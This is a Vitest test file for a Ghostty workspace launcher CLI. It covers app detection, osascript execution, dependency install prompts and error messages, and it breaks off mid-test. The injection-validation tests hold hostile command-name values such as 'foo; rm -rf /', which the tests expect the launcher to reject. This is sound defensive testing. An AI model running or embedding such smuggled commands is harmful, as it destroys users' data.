import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import type { BackendLaunchContext } from "./backends/ghostty.js";
import type { CLIOverrides } from "./config-resolve.js";

// Mock child_process before importing launcher
const mockExecSync = vi.fn();
const mockExecFileSync = vi.fn();
vi.mock("node:child_process", () => ({
  execSync: (...args: unknown[]) => mockExecSync(...args),
  execFileSync: (...args: unknown[]) => mockExecFileSync(...args),
}));

// Mock config
const mockReadKVFile = vi.fn((_path: string) => new Map<string, string>());
const mockReadCustomLayout = vi.fn((_name: string): Map<string, string> | null => null);
const mockIsCustomLayout = vi.fn((_name: string) => false);
vi.mock("./config.js", () => ({
  listConfig: vi.fn(() => new Map<string, string>()),
  listProjects: vi.fn(() => new Map<string, string>()),
  readKVFile: (path: string) => mockReadKVFile(path),
  readKVFromString: (text: string) => new Map(text.split("\n").filter((line) => line.includes("=")).map((line) => [line.slice(0, line.indexOf("=")), line.slice(line.indexOf("=") + 1)] as [string, string])),
  readCustomLayout: (name: string) => mockReadCustomLayout(name),
  isCustomLayout: (name: string) => mockIsCustomLayout(name),
  CONFIG_DIR: "/mock/.config/summon",
  STATUS_DIR: "/mock/.config/summon/status",
  LAYOUT_NAME_RE: /^[a-zA-Z][a-zA-Z0-9_-]*$/,
}));

// Mock backend detection: the table is covered by backend-detect.test.ts; here the launcher's
// seam is exercised by steering the resolved detection directly.
const mockResolveBackendForLaunch = vi.fn((): unknown => ({ ok: true, backend: "ghostty", placement: "outside", notices: [] }));
vi.mock("./backend.js", async (original) => ({
  ...(await original<typeof import("./backend.js")>()),
  resolveBackendForLaunch: () => mockResolveBackendForLaunch(),
}));

// Rex launch path (Phase 3): the adapter, adoption and switch decision are mocked; their own
// suites cover them. The fake backend records what the launcher hands it.
const mockAdoptOrphansForLaunch = vi.fn((_project: string): Array<{ text: string; routine?: true }> => []);
const mockMaybeSwitch = vi.fn((..._args: unknown[]): unknown => ({ kind: "proceed" }));
const mockSessionState = vi.fn((..._args: unknown[]): unknown => ({ state: "stopped", liveBlocks: [] }));
const rexLaunches: Array<{ kind: string; plan: unknown; ctx: Record<string, unknown> }> = [];
const REX_IDENTITY = {
  server: "unix:///tmp/rex.sock", hostId: "host-1",
  sessionId: "session:0000aaaa-0000-0000-0000-000000000001", windowId: "window:0000aaaa-0000-0000-0000-000000000002", rootBlockId: "block:0000aaaa-0000-0000-0000-000000000010",
  blocks: [{ name: "editor", blockId: "block:0000aaaa-0000-0000-0000-000000000010", label: "editor · vim" }, { name: "editor-2", blockId: "block:0000aaaa-0000-0000-0000-000000000011", label: "editor · vim" }],
};
const mockCreateRexBackend = vi.fn((_context: unknown, _deps: unknown) => ({
  id: "rex",
  async launchTraditional(plan: unknown, ctx: Record<string, unknown>) { rexLaunches.push({ kind: "traditional", plan, ctx }); return { rex: REX_IDENTITY }; },
  async launchTree(plan: unknown, ctx: Record<string, unknown>) { rexLaunches.push({ kind: "tree", plan, ctx }); return { rex: REX_IDENTITY }; },
}));
vi.mock("./backends/rex/backend.js", () => ({ createRexBackend: (context: unknown, deps: unknown) => mockCreateRexBackend(context, deps) }));
vi.mock("./backends/rex/launch.js", () => ({
  adoptOrphansForLaunch: (project: string, _deps: unknown) => mockAdoptOrphansForLaunch(project),
  adoptDeps: (...args: unknown[]) => mockAdoptDeps(...args),
  maybeSwitchToExisting: (...args: unknown[]) => mockMaybeSwitch(...args),
}));
const mockAdoptDeps = vi.fn((..._args: unknown[]) => ({}));
const SHARED_LISTINGS = { of: () => ({ ok: true, sessions: [] }) };
vi.mock("./backends/rex/status.js", () => ({ sessionState: (...args: unknown[]) => mockSessionState(...args), sessionListings: () => SHARED_LISTINGS }));
const mockCloseLauncherTab = vi.fn();
const mockStartLauncherTabWatch = vi.fn();
const mockMarkAttention = vi.fn();
vi.mock("./backends/rex/launcher-tab.js", () => ({ closeLauncherTabAfterRexLaunch: (...args: unknown[]) => mockCloseLauncherTab(...args), startLauncherTabWatch: (...args: unknown[]) => mockStartLauncherTabWatch(...args), markAttention: () => mockMarkAttention() }));
vi.mock("./backends/rex/cli.js", () => ({
  createRexCli: vi.fn((binary: string, server: string) => ({ binary, server, call: vi.fn() })),
  discoverRex: vi.fn(() => ({ path: "/usr/local/bin/rex", searched: ["PATH"] })),
}));

// Mock the record layer (write is a no-op in tests); the launch path never loads the status reader.
const mockReadStatusRecord = vi.fn((_project: string): unknown => null);
vi.mock("./status-record.js", () => ({
  publishStatus: vi.fn(() => "published"),
  readStatusRecord: (project: string) => mockReadStatusRecord(project),
  isLiveState: (state: string) => state === "active" || state === "partial",
}));

// Mock starship
const mockIsStarshipInstalled = vi.fn(() => false);
const mockEnsurePresetConfig = vi.fn(() => "/mock/.config/summon/starship/tokyo-night.toml");
const mockGetPresetConfigPath = vi.fn((name: string) => `/mock/.config/summon/starship/${name}.toml`);
vi.mock("./starship.js", () => ({
  isStarshipInstalled: mockIsStarshipInstalled,
  ensurePresetConfig: mockEnsurePresetConfig,
  getPresetConfigPath: mockGetPresetConfigPath,
  resetStarshipCache: vi.fn(),
}));

// Mock fs.existsSync for directory and Ghostty.app checks
const mockStatSync = vi.fn((_path: string): { isFile: () => boolean } => { throw new Error("ENOENT"); });
vi.mock("node:fs", () => ({
  existsSync: vi.fn(() => true),
  realpathSync: vi.fn((path: string) => path),
  statSync: (path: string) => mockStatSync(path),
  accessSync: () => {},
  constants: { X_OK: 1 },
  readFileSync: vi.fn((path: string) => {
    if (path.endsWith("Ghostty.sdef")) return '<class name="terminal"><property name="id"/><property name="pid"/><property name="tty"/></class>';
    // A project's .summon is the content mockReadKVFile describes: the launcher reads it once and parses those bytes (SE-M1).
    if (path.endsWith("/.summon")) return [...mockReadKVFile(path)].map(([key, value]) => `${key}=${value}\n`).join("");
    throw new Error("fixture absent");
  }),
}));

// Mock readline for prompt tests
const mockQuestion = vi.fn();
vi.mock("node:readline", () => ({
  createInterface: () => ({
    question: (_q: string, cb: (a: string) => void) => mockQuestion(_q, cb),
    close: vi.fn(),
    on: vi.fn(),
    off: vi.fn(),
  }),
}));

// Mock setup wizard — prevents real setup.js from loading via dynamic import
const mockRunSetup = vi.fn(async (..._args: unknown[]) => {});
vi.mock("./setup.js", () => ({
  runSetup: (...args: unknown[]) => mockRunSetup(...args),
}));

// Mock trust module — default no-op (trust passes), overridable per test
const mockAssertTrusted = vi.fn((_dir: string) => { /* no-op: trusted by default */ });
const mockAssertTrustedContent = vi.fn((_dir: string, _content: string) => { /* no-op: trusted */ });
vi.mock("./trust.js", () => ({
  assertTrusted: (dir: string) => mockAssertTrusted(dir),
  assertTrustedContent: (dir: string, content: string) => mockAssertTrustedContent(dir, content),
  SummonError: class SummonError extends Error {
    constructor(message: string) {
      super(message);
      this.name = "SummonError";
    }
  },
  hashContent: vi.fn((s: string) => s),
  hashSummonFile: vi.fn(() => null),
  isTrusted: vi.fn(() => true),
  trustProject: vi.fn(),
  handleTrustCommand: vi.fn(),
}));

// Mock script generator to isolate launcher logic
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const mockGenerateAppleScript = vi.fn((..._args: any[]) => 'tell application "Ghostty"\nend tell');
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const mockGenerateTreeAppleScript = vi.fn((..._args: any[]) => 'tell application "Ghostty"\n-- tree layout\nend tell');
vi.mock("./script.js", () => ({
  generateAppleScript: (...args: unknown[]) => mockGenerateAppleScript(...args),
  generateTreeAppleScript: (...args: unknown[]) => mockGenerateTreeAppleScript(...args),
  generateFocusScript: (title: string) => `focus ${title}`,
}));

// Import after mocks are set up
const { launch, resolveProjectName, probePaneCount, decideCleanRestoredPanes, layoutOptsToTreePlanOpts } = await import("./launcher.js");
const { readTrustedSummonFile, resolveConfig } = await import("./config-resolve.js");
const { closeCreatedContainer, withLaunchSpinner, GhosttyBackend, ghosttyCommandEntries } = await import("./backends/ghostty.js");
const { isStaticLaunchSpinner } = await import("./ui/progress.js");
const { planLayout } = await import("./layout.js");
const { buildTreePlan, findPaneByName, parseTreeDSL, resolveTreeCommands } = await import("./tree.js");
const { listConfig, listProjects } = await import("./config.js");
const { existsSync } = await import("node:fs");
const { TabOpenError } = await import("./errors.js");
const { LAUNCH_ID_RE } = await import("./launch-identity.js");
const { writingRoutine } = await import("./ui/output.js");
const { PromptCancelled } = await import("./utils.js");

/** resolveConfig with the `.summon` content the trusted read would hand it: whatever mockReadKVFile says about that file. */
function resolveConfigWithMockedSummon(targetDir: string, overrides: CLIOverrides): ReturnType<typeof resolveConfig> {
  const project = mockReadKVFile(`${targetDir}/.summon`);
  return resolveConfig(targetDir, overrides, [...project].map(([key, value]) => `${key}=${value}`).join("\n"));
}
const ANY_LAUNCH_ID = expect.stringMatching(LAUNCH_ID_RE);

let savedSummonWorkspace: string | undefined;

beforeEach(() => {
  vi.clearAllMocks();
  mockReadStatusRecord.mockReturnValue(null);
  mockAdoptOrphansForLaunch.mockReturnValue([]);
  mockMaybeSwitch.mockReturnValue({ kind: "proceed" });
  mockSessionState.mockReturnValue({ state: "stopped", liveBlocks: [] });
  rexLaunches.length = 0;
  // Prevent warnIfNested from activating when tests run inside a summon workspace
  savedSummonWorkspace = process.env.SUMMON_WORKSPACE;
  delete process.env.SUMMON_WORKSPACE;
  mockResolveBackendForLaunch.mockReturnValue({ ok: true, backend: "ghostty", placement: "outside", notices: [] });
  // Default: execSync no-ops (osascript, etc.)
  mockExecSync.mockImplementation(() => "");
  // Default: all commands are installed (resolveCommand uses execFileSync)
  mockExecFileSync.mockImplementation((bin: string, _args?: string[]) => {
    if (bin === "/usr/bin/which")
      return "/usr/bin/stub\n";
    return "";
  });
  vi.mocked(existsSync).mockReturnValue(true);
  mockReadKVFile.mockReturnValue(new Map<string, string>());
  mockReadCustomLayout.mockReturnValue(null);
  mockIsCustomLayout.mockReturnValue(false);
  vi.mocked(listConfig).mockReturnValue(new Map<string, string>([["editor", "vim"]]));
  vi.mocked(listProjects).mockReturnValue(new Map<string, string>());
  mockGenerateAppleScript.mockReturnValue('tell application "Ghostty"\nend tell');
  mockGenerateTreeAppleScript.mockReturnValue('tell application "Ghostty"\n-- tree layout\nend tell');
  // Trust mocks default to no-op (trusted)
  mockAssertTrusted.mockImplementation(() => {});
  mockAssertTrustedContent.mockImplementation(() => {});
  // Default: no absolute path exists, so absolute commands fail as a missing path
  mockStatSync.mockImplementation(() => { throw new Error("ENOENT"); });
});

afterEach(() => {
  if (savedSummonWorkspace !== undefined) {
    process.env.SUMMON_WORKSPACE = savedSummonWorkspace;
  } else {
    delete process.env.SUMMON_WORKSPACE;
  }
});

describe("Ghostty detection", () => {
  it("exits with error if directory does not exist", async () => {
    vi.mocked(existsSync).mockReturnValue(false);
    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/nonexistent")).rejects.toThrow("Directory not found");
    // UX-L3: the caller prints the thrown error once; the launch does not print it as well.
    expect(writeSpy).not.toHaveBeenCalled();
    writeSpy.mockRestore();
  });

  it("exits with error if Ghostty.app is not found at any known path", async () => {
    vi.mocked(existsSync).mockImplementation((path) => {
      // Ghostty not found anywhere
      if (String(path).endsWith("Ghostty.app")) return false;
      return true;
    });

    await expect(launch("/tmp/workspace")).rejects.toThrow("Ghostty.app not found");
  });

  it("finds Ghostty in ~/Applications (Homebrew)", async () => {
    vi.mocked(existsSync).mockImplementation((path) => {
      if (String(path) === "/Applications/Ghostty.app") return false;
      return true;
    });

    await launch("/tmp/workspace");
    expect(mockGenerateAppleScript).toHaveBeenCalled();
  });

  it("finds Ghostty in /Applications even if ~/Applications is missing", async () => {
    vi.mocked(existsSync).mockImplementation((path) => {
      if (String(path).endsWith("/Applications/Ghostty.app") && String(path) !== "/Applications/Ghostty.app") return false;
      return true;
    });

    await launch("/tmp/workspace");
    expect(mockGenerateAppleScript).toHaveBeenCalled();
  });
});

describe("script execution", () => {
  it("executes generated script via osascript", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace");

    expect(mockExecFileSync).toHaveBeenCalledWith(
      "osascript",
      [],
      expect.objectContaining({ input: 'tell application "Ghostty"\nend tell' }),
    );
  });

  it("prints script to stdout in dry-run mode without executing", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain('tell application "Ghostty"\nend tell');
    // osascript should NOT have been called
    expect(mockExecFileSync).not.toHaveBeenCalledWith(
      "osascript",
      [],
      expect.anything(),
    );
    logSpy.mockRestore();
  });

  it("passes correct plan and directory to generateAppleScript", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace", { layout: "minimal" });

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        leftColumnCount: 1,
        rightColumnEditorCount: 0,
        hasShell: false,
      }),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });

  it("uses the registered project name when the target path matches a project", async () => {
    vi.mocked(listProjects).mockReturnValue(new Map([["api", "/tmp/workspace"]]));

    await launch("/tmp/workspace");

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.anything(),
      "/tmp/workspace",
      null,
      undefined,
      "api",
      undefined,
      ANY_LAUNCH_ID,
    );
  });
});

describe("command dependency checks", () => {
  it("checks editor and sidebar commands before launching", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace");

    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/usr/bin/which", ["vim"], { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000, killSignal: "SIGKILL" },
    );
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/usr/bin/which", ["lazygit"], { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000, killSignal: "SIGKILL" },
    );
  });

  it("already-installed commands proceed without prompting", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace");

    expect(mockQuestion).not.toHaveBeenCalled();
  });

  it("offers to install a known missing command (claude)", async () => {
    let claudeCallCount = 0;
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") {
        claudeCallCount++;
        if (claudeCallCount <= 1) throw new Error("not found");
        return "/usr/bin/claude\n";
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      // npm install call — let it through
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    await launch("/tmp/workspace");

    expect(mockQuestion).toHaveBeenCalledTimes(1);
    expect(mockQuestion.mock.calls[0]![0]).toContain(
      "npm install -g @anthropic-ai/claude-code",
    );
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "npm",
      ["install", "-g", "@anthropic-ai/claude-code"],
      { stdio: "inherit" },
    );
  });

  it("exits when unknown command is missing", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "obscure-tool") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "obscure-tool"], ["sidebar", "htop"]]));

    await expect(launch("/tmp/workspace")).rejects.toThrow();
  });

  it("shows correct CLI syntax in error message for editor", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "obscure-tool") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "obscure-tool"], ["sidebar", "htop"]]));

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();

    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join("\n");
    expect(allWrites).toContain("summon set editor <command>");

    writeSpy.mockRestore();
  });

  it("shows correct CLI syntax in error message for sidebar", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "unknown-sidebar") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["sidebar", "unknown-sidebar"]]));

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();

    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join("\n");
    expect(allWrites).toContain("summon set sidebar <command>");

    writeSpy.mockRestore();
  });

  it("shows correct CLI syntax in error message for shell", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "unknown-shell") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["shell", "unknown-shell run dev"]]));

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();

    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join("\n");
    expect(allWrites).toContain("summon set shell <command>");

    writeSpy.mockRestore();
  });

  it("triggers wizard when editor and sidebar are empty strings in config (TTY)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", ""], ["sidebar", ""]]));
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });

    await launch("/tmp/workspace");

    // Empty editor triggers the setup wizard
    expect(mockRunSetup).toHaveBeenCalled();
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("exits with error when editor is empty in non-TTY mode", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", ""], ["sidebar", ""]]));
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    await expect(launch("/tmp/workspace")).rejects.toThrow("No editor configured");
    // UX-L3: printed once, by the caller that reports the thrown error.
    expect(writeSpy).not.toHaveBeenCalledWith(expect.stringContaining("No editor configured"));
    writeSpy.mockRestore();
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("exits when user declines install", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("n");
    });
    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    // UX-L3: `n` at a confirmation prompt is a user cancel (exit 130, no error prefix), and no installer ran.
    await expect(launch("/tmp/workspace")).rejects.toBeInstanceOf(PromptCancelled);
    expect(writeSpy).not.toHaveBeenCalled();
    expect(mockMarkAttention).not.toHaveBeenCalled();
    writeSpy.mockRestore();
  });

  it("flags the launcher-tab watch when an installer ran with inherited stdio (QA-M3)", async () => {
    let calls = 0;
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") {
        if (++calls <= 1) throw new Error("not found");
        return "/usr/bin/claude\n";
      }
      if (bin === "/usr/bin/which") return "/usr/bin/stub\n";
      if (bin === "npm") expect(mockMarkAttention).toHaveBeenCalledTimes(1);
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));

    await launch("/tmp/workspace");

    // The installer keeps the terminal (stdio inherit); the watch cannot see its output, so it is flagged.
    expect(mockExecFileSync).toHaveBeenCalledWith("npm", ["install", "-g", "@anthropic-ai/claude-code"], { stdio: "inherit" });
    expect(mockMarkAttention).toHaveBeenCalledTimes(1);
  });
});

describe("secondaryEditor binary check", () => {
  it("checks secondaryEditor binary when btop preset is used", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace", { layout: "btop" });

    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/usr/bin/which", ["btop"], { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000, killSignal: "SIGKILL" },
    );
  });
});

describe("ensureCommand error paths", () => {
  it("exits when install command throws an error", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      // Accessibility pre-flight check — allow through
      if (bin === "osascript") return "";
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      // npm install call — simulate failure
      throw new Error("install failed");
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join("\n");
    expect(allWrites).toContain("Failed to install `claude`. Please install it manually and try again.");
    writeSpy.mockRestore();
  });

  it("exits when command still not found after successful install", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      // npm install call — succeed but command still not found
      return Buffer.from("");
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join("\n");
    expect(allWrites).toContain("`claude` still not found after install. Please check your PATH.");
    writeSpy.mockRestore();
  });
});

describe("lazygit install handler", () => {
  it("offers to install lazygit via brew when missing and brew is available", async () => {
    let lazygitCallCount = 0;
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "lazygit") {
        lazygitCallCount++;
        if (lazygitCallCount <= 1) throw new Error("not found");
        return "/usr/bin/lazygit\n";
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      // brew install call — let it through
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    await launch("/tmp/workspace");

    expect(mockQuestion).toHaveBeenCalledTimes(1);
    expect(mockQuestion.mock.calls[0]![0]).toContain("brew install lazygit");
    // PE-L3: the brew lookup is killed after a timeout instead of hanging the launch.
    expect(mockExecFileSync).toHaveBeenCalledWith("/bin/sh", ["-c", "command -v brew"], { stdio: "ignore", timeout: 5000, killSignal: "SIGKILL" });
    expect(mockExecFileSync).toHaveBeenCalledWith(
      "brew",
      ["install", "lazygit"],
      { stdio: "inherit" },
    );
  });

  it("shows no-known-install-method error when lazygit missing and brew unavailable", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "lazygit") throw new Error("not found");
      // brew check (called with stdio: "ignore", no "--" arg)
      if (bin === "/bin/sh" && Array.isArray(args) && args[1] === "command -v brew") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();

    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join("\n");
    expect(allWrites).toContain("no known install method");

    writeSpy.mockRestore();
  });
});

describe("command name validation", () => {
  it("rejects command names with shell injection characters via resolveCommandPath (#169)", async () => {
    // resolveCommandPath in utils.ts validates command names (SAFE_COMMAND_RE) and returns null for invalid ones.
    // ensureCommand then exits because the invalid name is not installable.
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "foo; rm -rf /"]]));

    await expect(launch("/tmp/workspace")).rejects.toThrow();
  });

  it("rejects command names with backticks via resolveCommandPath (#169)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "`evil`"]]));

    await expect(launch("/tmp/workspace")).rejects.toThrow();
  });

  it("accepts valid command names with dots and hyphens", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "my-editor.v2"], ["sidebar", "htop"]]));

    await launch("/tmp/workspace");

    expect(mockExecFileSync).toHaveBeenCalledWith(
      "/usr/bin/which", ["my-editor.v2"], { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000, killSignal: "SIGKILL" },
    );
  });
});

describe("osascript error handling", () => {
  it("shows generic error with Ghostty hint for non-accessibility errors", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecFileSync.mockImplementation((bin: string, args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript" && opts?.input) {
        throw new Error("execution error: Ghostty got an error: connection is invalid (-609)");
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allWrites).toContain("connection is invalid (-609)");
    expect(allWrites).toContain("Is Ghostty running?");
    expect(allWrites).toMatch(/Accessibility/);
    expect(allWrites).toMatch(/Automation/);
    expect(allWrites).toContain("summon doctor");
    writeSpy.mockRestore();
  });

  it("shows accessibility-specific error when osascript reports assistive access", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecFileSync.mockImplementation((bin: string, args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript" && opts?.input) {
        throw new Error("Command failed: osascript\n795:799: execution error: System Events got an error: osascript is not allowed assistive access. (-1719)");
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allWrites).toContain("Accessibility permission");
    expect(allWrites).not.toContain("Is Ghostty running?");
    expect(allWrites).toContain("summon doctor");
    writeSpy.mockRestore();
  });

  it("shows accessibility-specific error when osascript reports error code -1719", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecFileSync.mockImplementation((bin: string, args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript" && opts?.input) {
        throw new Error("execution error: System Events got an error: (-1719)");
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allWrites).toContain("Accessibility permission");
    expect(allWrites).not.toContain("Is Ghostty running?");
    expect(allWrites).toContain("summon doctor");
    writeSpy.mockRestore();
  });

  it("handles non-Error thrown values gracefully", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecFileSync.mockImplementation((bin: string, args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript" && opts?.input) {
        throw "string error";
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allWrites).toContain("string error");
    writeSpy.mockRestore();
  });
});

describe("pre-flight accessibility check", () => {
  /** Mock execFileSync so all osascript calls throw an accessibility error. */
  const mockAccessibilityDenied = () => {
    mockExecFileSync.mockImplementation((bin: string, _args?: string[]) => {
      if (bin === "osascript") {
        throw new Error("assistive access (-1719)");
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
  };

  it("exits with error when accessibility is not granted", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockAccessibilityDenied();

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow("Accessibility permission");
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allWrites).toContain("Accessibility permission is required");
    expect(allWrites).toContain("System Events");
    expect(allWrites).toContain("summon doctor");
    writeSpy.mockRestore();
  });

  it("proceeds when the probe timed out (unknown, PE-L3); the workspace script then reports a real denial", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    let mainScript: "ok" | "denied" = "ok";
